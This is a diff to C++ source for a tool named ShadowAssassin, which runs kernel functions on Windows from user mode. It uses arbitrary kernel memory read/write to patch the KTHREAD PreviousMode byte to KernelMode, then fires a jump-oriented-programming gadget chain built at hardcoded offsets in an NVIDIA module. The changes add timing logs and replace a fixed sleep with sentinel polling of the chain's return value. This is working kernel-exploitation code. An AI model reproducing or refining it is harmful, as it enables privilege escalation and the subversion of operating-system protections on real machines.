@@ -53,7 +53,8 @@ JOPManager&   ShadowAssassin::GetJOPManager()   { return jopManager;   }
 
 
 bool ShadowAssassin::Initialize() {
-    DWORD t0 = GetTickCount();
+    UINT64 t0 = TimeUs();
+    DbgLog("\n=== ShadowAssassin Initialize ===\n");
 
     if (!readFn || !writeFn) {
         DbgLog("[Initialize] FAIL: readFn=%d writeFn=%d\n", (bool)readFn, (bool)writeFn);
@@ -94,7 +95,6 @@ bool ShadowAssassin::Initialize() {
         wchar_t path[MAX_PATH];
         swprintf_s(path, L"%s\\%s", sysDir, ntosNames[i]);
         if (img.Open(path)) {
-            DbgLog("[ShadowAssassin::Initialize] Mapped %ls\n", path);
             break;
         }
     }
@@ -105,7 +105,6 @@ bool ShadowAssassin::Initialize() {
 
     UINT64 dataSectionRva = GetSectionRva(img, ".data");
 
-    // Build export cache from disk image — O(n) once, all subsequent lookups are O(1)
     BuildExportCache(img);
     img.Close();
 
@@ -142,7 +141,7 @@ bool ShadowAssassin::Initialize() {
 
 	jopManager.SetNvidiaBase(nvidia_base);
 
-    DbgLog("[Initialize] Done in %lums\n", GetTickCount() - t0);
+    DbgLog("\n[Initialize] Done in %s\n\n", FmtMs(TimeUs() - t0).c_str());
     return true;
 }
 
@@ -157,7 +156,6 @@ UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectio
 
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         if (strncmp((const char*)sec[i].Name, sectionName, 8) == 0) {
-            DbgLog("[GetSectionRva] %s -> RVA=0x%lX\n", sectionName, sec[i].VirtualAddress);
             return sec[i].VirtualAddress;
         }
     }
@@ -168,7 +166,7 @@ UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectio
 
 
 void ShadowAssassin::BuildExportCache(const ImageMapping& img) {
-    DWORD t0 = GetTickCount();
+    UINT64 t0 = TimeUs();
     if (!img.view) return;
 
     auto dos = (PIMAGE_DOS_HEADER)img.view;
@@ -189,7 +187,7 @@ void ShadowAssassin::BuildExportCache(const ImageMapping& img) {
         exportCache[name] = rva;
     }
 
-    DbgLog("[BuildExportCache] %zu exports cached in %lums\n", exportCache.size(), GetTickCount() - t0);
+    DbgLog("[BuildExportCache] %zu exports cached in %s\n", exportCache.size(), FmtMs(TimeUs() - t0).c_str());
 }
 
 UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
@@ -243,12 +241,15 @@ UINT64 ShadowAssassin::GetModuleBaseAddress(const char* targetName) {
 }
 
 UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {
+    UINT64 t0 = TimeUs();
 	UINT64 funcAddr = ResolveKernelExport(name);
 	if (!funcAddr) {
-		DbgLog("[CallSyscall] FAIL: could not resolve '%s'\n", name.c_str());
+		DbgLog("[CallSyscall] FAIL: could not resolve '%s'\n\n", name.c_str());
 		return 0;
 	}
-	return CallSyscallByAddress(funcAddr, params);
+    UINT64 result = CallSyscallByAddress(funcAddr, params);
+    DbgLog("[CallSyscall] %s -> 0x%llX  total=%s\n\n", name.c_str(), result, FmtMs(TimeUs() - t0).c_str());
+    return result;
 }
 
 
@@ -259,17 +260,19 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
         return 0;
     }
 
-    DWORD t0 = GetTickCount();
+    UINT64 t0 = TimeUs();
 
     frameManager.CreateFrozenThread();
+    UINT64 tFrame = TimeUs() - t0;
 
     UINT64 frameBase = frameManager.GetFrameAddress();
     if (!frameBase) {
         DbgLog("[CallSyscallByAddress] FAIL: no frame\n");
         return 0;
     }
-    DbgLog("[CallSyscallByAddress] 0x%llX frame=%lums\n", funcAddr, GetTickCount() - t0);
+    DbgLog("\n[CallSyscallByAddress] 0x%llX  thread=%s\n", funcAddr, FmtMs(tFrame).c_str());
 
+    UINT64 tSetup0 = TimeUs();
     // Set PreviousMode = KernelMode (0) — read surrounding 8 bytes, patch the byte, write back
     UINT64 kthread   = frameManager.GetKthreadAddress();
     UINT64 pmAligned = kthread ? (kthread + (OFF_KTHREAD_PREVIOUS_MODE & ~7ULL)) : 0;
@@ -277,8 +280,7 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
     if (kthread) {
         UINT64 pmQword = 0;
         readFn(&pmQword, pmAligned, sizeof(UINT64));
-        writeFn(pmAligned, pmQword & ~(0xFFULL << (pmByte * 8))); // clear byte = KernelMode(0)
-        DbgLog("[CallSyscallByAddress] PreviousMode=KernelMode on KTHREAD=0x%llX\n", kthread);
+        writeFn(pmAligned, pmQword & ~(0xFFULL << (pmByte * 8)));
     }
 
     jopManager.Build(0x0078CB9E, 0x006d066a, 0x00671319, 0x0061cbb5);
@@ -303,13 +305,27 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
     writeFn(newRsp + 0x30, jopManager.GetRdiForJmp());
 
     frameManager.WriteRegister("rsp", newRsp + 0x30);
+    DbgLog("[CallSyscallByAddress] setup=%s\n", FmtMs(TimeUs() - tSetup0).c_str());
 
-    DWORD tFire = GetTickCount();
+    // Write sentinel before firing so we can detect when gadget3 overwrites it
+    const UINT64 SENTINEL = 0xDEADC0DEDEADC0DEULL;
+    writeFn(jopManager.GetReturnValueAddr(), SENTINEL);
+
+    UINT64 tFire = TimeUs();
     frameManager.ContinueThread();
 
-    Sleep(50); // wait for chain to complete
-    UINT64 retVal = 0;
-    readFn(&retVal, jopManager.GetReturnValueAddr(), sizeof(UINT64));
+    // Poll until gadget3 writes the real return value (replaces sentinel)
+    UINT64 retVal = SENTINEL;
+    const UINT64 TIMEOUT_US = 2000000ULL; // 2 seconds
+    while (retVal == SENTINEL && (TimeUs() - tFire) < TIMEOUT_US) {
+        Sleep(1);
+        readFn(&retVal, jopManager.GetReturnValueAddr(), sizeof(UINT64));
+    }
+
+    if (retVal == SENTINEL) {
+        DbgLog("[CallSyscallByAddress] TIMEOUT: chain did not complete in 2000ms\n");
+        retVal = 0;
+    }
 
     // Restore PreviousMode = UserMode (1)
     if (kthread) {
@@ -318,7 +334,7 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
         UINT64 pmQwordUser = (pmQword & ~(0xFFULL << (pmByte * 8))) | (1ULL << (pmByte * 8));
         writeFn(pmAligned, pmQwordUser);
     }
-    DbgLog("[CallSyscallByAddress] -> 0x%llX (chain %lums, total %lums)\n",
-        retVal, GetTickCount() - tFire, GetTickCount() - t0);
+    DbgLog("[CallSyscallByAddress] -> 0x%llX (chain %s, total %s)\n\n",
+        retVal, FmtMs(TimeUs() - tFire).c_str(), FmtMs(TimeUs() - t0).c_str());
     return retVal;
 }
